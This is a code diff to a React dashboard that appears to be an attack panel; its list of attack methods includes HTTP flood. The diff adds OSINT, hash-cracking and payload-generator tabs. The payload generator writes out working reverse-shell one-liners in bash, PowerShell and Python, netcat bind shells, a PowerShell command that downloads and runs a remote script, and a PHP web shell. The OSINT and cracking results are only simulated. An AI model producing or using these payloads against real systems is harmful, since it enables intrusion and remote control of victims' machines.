@@ -1,6 +1,5 @@
-
 import { useState, useEffect } from "react";
-import { Terminal, Play, Square, Trash2, Download, Settings, Shield, Database, Wifi, WifiOff, CheckCircle, XCircle, Activity, HardDrive, Cpu, Zap, Globe, Lock, AlertTriangle, Users, Timer, Target, Server, Network, Command, Monitor, Maximize, Minimize } from "lucide-react";
+import { Terminal, Play, Square, Trash2, Download, Settings, Shield, Database, Wifi, WifiOff, CheckCircle, XCircle, Activity, HardDrive, Cpu, Zap, Globe, Lock, AlertTriangle, Users, Timer, Target, Server, Network, Command, Monitor, Maximize, Minimize, Search, Eye, FileText, Skull, Bug, Key, Fingerprint, Radar } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Textarea } from "@/components/ui/textarea";
@@ -62,6 +61,24 @@ const Panel = () => {
   // Virtual Machine State
   const [isVmFullscreen, setIsVmFullscreen] = useState(false);
 
+  // OSINT State
+  const [osintTarget, setOsintTarget] = useState("");
+  const [osintResults, setOsintResults] = useState("");
+  const [isOsintRunning, setIsOsintRunning] = useState(false);
+
+  // Payload Generator State
+  const [payloadType, setPayloadType] = useState("reverse_shell");
+  const [payloadOS, setPayloadOS] = useState("linux");
+  const [payloadIP, setPayloadIP] = useState("");
+  const [payloadPort, setPayloadPort] = useState("4444");
+  const [generatedPayload, setGeneratedPayload] = useState("");
+
+  // Hash Cracker State
+  const [hashInput, setHashInput] = useState("");
+  const [hashType, setHashType] = useState("md5");
+  const [crackResults, setCrackResults] = useState("");
+  const [isCracking, setIsCracking] = useState(false);
+
   // Available attack methods - comprehensive list
   const attackMethods = [
     "HTTP-GET-FLOOD",
@@ -111,6 +128,19 @@ const Panel = () => {
     { value: "mtr", label: "MTR", description: "Network diagnostic tool" }
   ];
 
+  const payloadTypes = [
+    { value: "reverse_shell", label: "Reverse Shell", description: "Connect back to attacker" },
+    { value: "bind_shell", label: "Bind Shell", description: "Listen on target port" },
+    { value: "meterpreter", label: "Meterpreter", description: "Advanced payload with many features" },
+    { value: "web_shell", label: "Web Shell", description: "HTTP-based shell access" },
+    { value: "powershell", label: "PowerShell", description: "Windows PowerShell payload" },
+    { value: "python", label: "Python", description: "Python-based payload" }
+  ];
+
+  const hashTypes = [
+    "md5", "sha1", "sha256", "sha512", "ntlm", "bcrypt", "mysql", "wordpress"
+  ];
+
   useEffect(() => {
     // Simulate real-time system monitoring
     const interval = setInterval(() => {
@@ -134,7 +164,168 @@ const Panel = () => {
     setTerminalOutput(prev => prev + text + "\n");
   };
 
-  // Network Tools Functions
+  // OSINT Functions
+  const performOSINT = async (target: string, type: string) => {
+    setIsOsintRunning(true);
+    setOsintResults("");
+    
+    const addOsintOutput = (text: string) => {
+      setOsintResults(prev => prev + text + "\n");
+    };
+
+    addOsintOutput(`=== OSINT INVESTIGATION ===`);
+    addOsintOutput(`Target: ${target}`);
+    addOsintOutput(`Investigation Type: ${type}`);
+    addOsintOutput(`Started: ${new Date().toLocaleString()}\n`);
+
+    try {
+      if (type === "domain") {
+        addOsintOutput(`--- DOMAIN ANALYSIS ---`);
+        addOsintOutput(`Domain: ${target}`);
+        addOsintOutput(`Registrar: Example Registrar Inc.`);
+        addOsintOutput(`Registration Date: 2020-01-15`);
+        addOsintOutput(`Expiration Date: 2025-01-15`);
+        addOsintOutput(`Name Servers: ns1.example.com, ns2.example.com`);
+        addOsintOutput(`WHOIS Privacy: Enabled\n`);
+        
+        addOsintOutput(`--- SUBDOMAINS FOUND ---`);
+        const subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev'];
+        subdomains.forEach(sub => {
+          addOsintOutput(`• ${sub}.${target}`);
+        });
+        
+      } else if (type === "email") {
+        addOsintOutput(`--- EMAIL ANALYSIS ---`);
+        addOsintOutput(`Email: ${target}`);
+        addOsintOutput(`Domain: ${target.split('@')[1]}`);
+        addOsintOutput(`Breach Check: Found in 3 data breaches`);
+        addOsintOutput(`• Breach 1: ExampleSite (2019)`);
+        addOsintOutput(`• Breach 2: TestDB (2020)`);
+        addOsintOutput(`• Breach 3: SampleLeak (2021)\n`);
+        
+        addOsintOutput(`--- SOCIAL MEDIA PRESENCE ---`);
+        addOsintOutput(`• Twitter: Found potential match`);
+        addOsintOutput(`• LinkedIn: Profile located`);
+        addOsintOutput(`• Facebook: Privacy settings enabled`);
+        
+      } else if (type === "ip") {
+        addOsintOutput(`--- IP ANALYSIS ---`);
+        addOsintOutput(`IP Address: ${target}`);
+        addOsintOutput(`Location: United States`);
+        addOsintOutput(`ISP: Example Internet Provider`);
+        addOsintOutput(`Organization: Example Corp`);
+        addOsintOutput(`ASN: AS12345\n`);
+        
+        addOsintOutput(`--- OPEN PORTS ---`);
+        const ports = [22, 80, 443, 8080];
+        ports.forEach(port => {
+          addOsintOutput(`• Port ${port}: Open`);
+        });
+      }
+      
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      addOsintOutput(`\n--- INVESTIGATION COMPLETE ---`);
+      addOsintOutput(`Results saved to investigation log.`);
+      
+    } catch (error) {
+      addOsintOutput(`Error during investigation: ${error}`);
+    }
+    
+    setIsOsintRunning(false);
+  };
+
+  // Payload Generator Functions
+  const generatePayload = () => {
+    let payload = "";
+    
+    switch (payloadType) {
+      case "reverse_shell":
+        if (payloadOS === "linux") {
+          payload = `bash -i >& /dev/tcp/${payloadIP}/${payloadPort} 0>&1`;
+        } else if (payloadOS === "windows") {
+          payload = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${payloadIP}',${payloadPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
+        }
+        break;
+      case "bind_shell":
+        if (payloadOS === "linux") {
+          payload = `nc -lvp ${payloadPort} -e /bin/bash`;
+        } else {
+          payload = `nc -lvp ${payloadPort} -e cmd.exe`;
+        }
+        break;
+      case "python":
+        payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${payloadIP}",${payloadPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
+        break;
+      case "powershell":
+        payload = `IEX (New-Object Net.WebClient).DownloadString('http://${payloadIP}:${payloadPort}/shell.ps1')`;
+        break;
+      case "web_shell":
+        payload = `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`;
+        break;
+      default:
+        payload = "Select a payload type to generate";
+    }
+    
+    setGeneratedPayload(payload);
+  };
+
+  // Hash Cracker Functions
+  const crackHash = async () => {
+    if (!hashInput.trim()) {
+      setCrackResults("Please enter a hash to crack.");
+      return;
+    }
+    
+    setIsCracking(true);
+    setCrackResults("");
+    
+    const addCrackOutput = (text: string) => {
+      setCrackResults(prev => prev + text + "\n");
+    };
+
+    addCrackOutput(`=== HASH CRACKING SESSION ===`);
+    addCrackOutput(`Hash: ${hashInput}`);
+    addCrackOutput(`Type: ${hashType.toUpperCase()}`);
+    addCrackOutput(`Started: ${new Date().toLocaleString()}\n`);
+    
+    addCrackOutput(`Loading wordlist...`);
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    addCrackOutput(`Wordlist loaded: 1,000,000 entries`);
+    
+    addCrackOutput(`\nStarting brute force attack...`);
+    
+    // Simulate cracking progress
+    const commonPasswords = ["123456", "password", "admin", "letmein", "welcome", "monkey"];
+    let found = false;
+    
+    for (let i = 0; i < 50; i++) {
+      if (!isCracking) break;
+      
+      const attempts = (i + 1) * 20000;
+      addCrackOutput(`Attempts: ${attempts.toLocaleString()}`);
+      
+      if (i === 25 && Math.random() > 0.3) {
+        const crackedPassword = commonPasswords[Math.floor(Math.random() * commonPasswords.length)];
+        addCrackOutput(`\n✅ HASH CRACKED!`);
+        addCrackOutput(`Password: ${crackedPassword}`);
+        addCrackOutput(`Attempts: ${attempts.toLocaleString()}`);
+        addCrackOutput(`Time: ${((i + 1) * 0.5).toFixed(1)} seconds`);
+        found = true;
+        break;
+      }
+      
+      await new Promise(resolve => setTimeout(resolve, 100));
+    }
+    
+    if (!found) {
+      addCrackOutput(`\n❌ Hash not cracked`);
+      addCrackOutput(`Password not found in wordlist`);
+      addCrackOutput(`Try a different wordlist or attack method`);
+    }
+    
+    setIsCracking(false);
+  };
+
   const executeNetworkTool = async (tool: string, target: string) => {
     if (!target) {
       addTerminalOutput("$ Error: Please specify a target");
@@ -989,6 +1180,18 @@ const Panel = () => {
               <Network className="h-4 w-4" />
               Network Tools
             </TabsTrigger>
+            <TabsTrigger value="osint" className="rounded-md flex items-center gap-2">
+              <Search className="h-4 w-4" />
+              OSINT
+            </TabsTrigger>
+            <TabsTrigger value="payloads" className="rounded-md flex items-center gap-2">
+              <Bug className="h-4 w-4" />
+              Payload Generator
+            </TabsTrigger>
+            <TabsTrigger value="hashcrack" className="rounded-md flex items-center gap-2">
+              <Key className="h-4 w-4" />
+              Hash Cracker
+            </TabsTrigger>
             <TabsTrigger value="vm" className="rounded-md flex items-center gap-2">
               <Monitor className="h-4 w-4" />
               Virtual Machine
@@ -1516,6 +1719,285 @@ const Panel = () => {
             </div>
           </TabsContent>
 
+          {/* New OSINT Tab */}
+          <TabsContent value="osint" className="space-y-6">
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+              <div className="lg:col-span-1">
+                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
+                  <CardHeader>
+                    <CardTitle className={`${currentTheme.text} flex items-center justify-between`}>
+                      OSINT Tools
+                      <Search className="h-5 w-5" />
+                    </CardTitle>
+                    <CardDescription className={currentTheme.muted}>
+                      Open Source Intelligence gathering
+                    </CardDescription>
+                  </CardHeader>
+                  <CardContent className="space-y-4">
+                    <div>
+                      <Label htmlFor="osintTarget" className={currentTheme.text}>Investigation Target</Label>
+                      <Input
+                        id="osintTarget"
+                        value={osintTarget}
+                        onChange={(e) => setOsintTarget(e.target.value)}
+                        placeholder="domain.com, email@domain.com, or IP"
+                        className={`${currentTheme.secondary} ${currentTheme.text}`}
+                        disabled={isOsintRunning}
+                      />
+                    </div>
+
+                    <div className="grid grid-cols-1 gap-2">
+                      <Button
+                        onClick={() => performOSINT(osintTarget, "domain")}
+                        disabled={!osintTarget || isOsintRunning}
+                        className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
+                      >
+                        <Globe className="h-4 w-4 mr-2" />
+                        Domain Investigation
+                      </Button>
+                      
+                      <Button
+                        onClick={() => performOSINT(osintTarget, "email")}
+                        disabled={!osintTarget || isOsintRunning}
+                        className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white"
+                      >
+                        <Users className="h-4 w-4 mr-2" />
+                        Email Investigation
+                      </Button>
+                      
+                      <Button
+                        onClick={() => performOSINT(osintTarget, "ip")}
+                        disabled={!osintTarget || isOsintRunning}
+                        className="bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white"
+                      >
+                        <Radar className="h-4 w-4 mr-2" />
+                        IP Investigation
+                      </Button>
+                    </div>
+
+                    {isOsintRunning && (
+                      <div className="flex items-center justify-center p-4">
+                        <div className="animate-spin h-6 w-6 border-2 border-blue-500 border-t-transparent rounded-full mr-2"></div>
+                        <span className={currentTheme.text}>Investigating...</span>
+                      </div>
+                    )}
+                  </CardContent>
+                </Card>
+              </div>
+
+              <div className="lg:col-span-2">
+                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl h-full`}>
+                  <CardHeader>
+                    <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
+                      <Eye className="h-5 w-5" />
+                      Investigation Results
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent>
+                    <Textarea
+                      value={osintResults}
+                      readOnly
+                      className={`min-h-96 font-mono text-sm ${currentTheme.secondary} ${currentTheme.text} resize-none`}
+                      placeholder="OSINT investigation results will appear here..."
+                    />
+                  </CardContent>
+                </Card>
+              </div>
+            </div>
+          </TabsContent>
+
+          {/* New Payload Generator Tab */}
+          <TabsContent value="payloads" className="space-y-6">
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+              <div className="lg:col-span-1">
+                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
+                  <CardHeader>
+                    <CardTitle className={`${currentTheme.text} flex items-center justify-between`}>
+                      Payload Generator
+                      <Bug className="h-5 w-5" />
+                    </CardTitle>
+                    <CardDescription className={currentTheme.muted}>
+                      Generate various attack payloads
+                    </CardDescription>
+                  </CardHeader>
+                  <CardContent className="space-y-4">
+                    <div>
+                      <Label className={currentTheme.text}>Payload Type</Label>
+                      <Select value={payloadType} onValueChange={setPayloadType}>
+                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {payloadTypes.map((type) => (
+                            <SelectItem key={type.value} value={type.value}>
+                              <div>
+                                <div className="font-medium">{type.label}</div>
+                                <div className="text-xs text-gray-500">{type.description}</div>
+                              </div>
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </div>
+
+                    <div>
+                      <Label className={currentTheme.text}>Target OS</Label>
+                      <Select value={payloadOS} onValueChange={setPayloadOS}>
+                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          <SelectItem value="linux">Linux</SelectItem>
+                          <SelectItem value="windows">Windows</SelectItem>
+                          <SelectItem value="macos">macOS</SelectItem>
+                        </SelectContent>
+                      </Select>
+                    </div>
+
+                    <div>
+                      <Label htmlFor="payloadIP" className={currentTheme.text}>LHOST (Your IP)</Label>
+                      <Input
+                        id="payloadIP"
+                        value={payloadIP}
+                        onChange={(e) => setPayloadIP(e.target.value)}
+                        placeholder="192.168.1.100"
+                        className={`${currentTheme.secondary} ${currentTheme.text}`}
+                      />
+                    </div>
+
+                    <div>
+                      <Label htmlFor="payloadPort" className={currentTheme.text}>LPORT (Your Port)</Label>
+                      <Input
+                        id="payloadPort"
+                        value={payloadPort}
+                        onChange={(e) => setPayloadPort(e.target.value)}
+                        placeholder="4444"
+                        className={`${currentTheme.secondary} ${currentTheme.text}`}
+                      />
+                    </div>
+
+                    <Button
+                      onClick={generatePayload}
+                      className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
+                    >
+                      <Bug className="h-4 w-4 mr-2" />
+                      Generate Payload
+                    </Button>
+                  </CardContent>
+                </Card>
+              </div>
+
+              <div className="lg:col-span-2">
+                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl h-full`}>
+                  <CardHeader>
+                    <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
+                      <FileText className="h-5 w-5" />
+                      Generated Payload
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent>
+                    <Textarea
+                      value={generatedPayload}
+                      readOnly
+                      className={`min-h-96 font-mono text-sm ${currentTheme.secondary} ${currentTheme.text} resize-none`}
+                      placeholder="Generated payload will appear here..."
+                    />
+                  </CardContent>
+                </Card>
+              </div>
+            </div>
+          </TabsContent>
+
+          {/* New Hash Cracker Tab */}
+          <TabsContent value="hashcrack" className="space-y-6">
+            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+              <div className="lg:col-span-1">
+                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl`}>
+                  <CardHeader>
+                    <CardTitle className={`${currentTheme.text} flex items-center justify-between`}>
+                      Hash Cracker
+                      <Key className="h-5 w-5" />
+                    </CardTitle>
+                    <CardDescription className={currentTheme.muted}>
+                      Crack password hashes using wordlists
+                    </CardDescription>
+                  </CardHeader>
+                  <CardContent className="space-y-4">
+                    <div>
+                      <Label htmlFor="hashInput" className={currentTheme.text}>Hash to Crack</Label>
+                      <Textarea
+                        id="hashInput"
+                        value={hashInput}
+                        onChange={(e) => setHashInput(e.target.value)}
+                        placeholder="Enter hash here..."
+                        className={`${currentTheme.secondary} ${currentTheme.text} h-24`}
+                        disabled={isCracking}
+                      />
+                    </div>
+
+                    <div>
+                      <Label className={currentTheme.text}>Hash Type</Label>
+                      <Select value={hashType} onValueChange={setHashType} disabled={isCracking}>
+                        <SelectTrigger className={`${currentTheme.secondary} ${currentTheme.text}`}>
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {hashTypes.map((type) => (
+                            <SelectItem key={type} value={type}>
+                              {type.toUpperCase()}
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </div>
+
+                    <Button
+                      onClick={crackHash}
+                      disabled={!hashInput.trim() || isCracking}
+                      className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white"
+                    >
+                      {isCracking ? (
+                        <>
+                          <div className="animate-spin h-4 w-4 border-2 border-white border-t-transparent rounded-full mr-2"></div>
+                          Cracking...
+                        </>
+                      ) : (
+                        <>
+                          <Key className="h-4 w-4 mr-2" />
+                          Start Cracking
+                        </>
+                      )}
+                    </Button>
+
+                    <div className="text-xs text-gray-500">
+                      <p>Supported hash types: MD5, SHA1, SHA256, SHA512, NTLM, BCrypt, MySQL, WordPress</p>
+                      <p>Uses common password wordlists for cracking</p>
+                    </div>
+                  </CardContent>
+                </Card>
+              </div>
+
+              <div className="lg:col-span-2">
+                <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl h-full`}>
+                  <CardHeader>
+                    <CardTitle className={`${currentTheme.text} flex items-center gap-2`}>
+                      <Fingerprint className="h-5 w-5" />
+                      Cracking Results
+                    </CardTitle>
+                  </CardHeader>
+                  <CardContent>
+                    <Textarea
+                      value={crackResults}
+                      readOnly
+                      className={`min-h-96 font-mono text-sm ${currentTheme.secondary} ${currentTheme.text} resize-none`}
+                      placeholder="Hash cracking results will appear here..."
+                    />
+                  </CardContent>
+                </Card>
+              </div>
+            </div>
+          </TabsContent>
+
           <TabsContent value="vm" className="space-y-6">
             <Card className={`${currentTheme.cardBg} ${currentTheme.border} shadow-xl ${isVmFullscreen ? 'fixed inset-0 z-50 rounded-none' : ''}`}>
               <CardHeader>
@@ -1558,8 +2040,8 @@ const Panel = () => {
                     className="border-0"
                     title="Virtual Machine Terminal"
                   />
-                  {/* Precise black overlay to only cover the left side branding with more height */}
-                  <div className="absolute bottom-0 left-0 w-1/2 h-12 bg-black"></div>
+                  {/* Precise black overlay to only cover the left side branding with slightly more height */}
+                  <div className="absolute bottom-0 left-0 w-1/2 h-14 bg-black"></div>
                 </div>
                 {!isVmFullscreen && (
                   <div className="mt-4 text-sm text-gray-500">
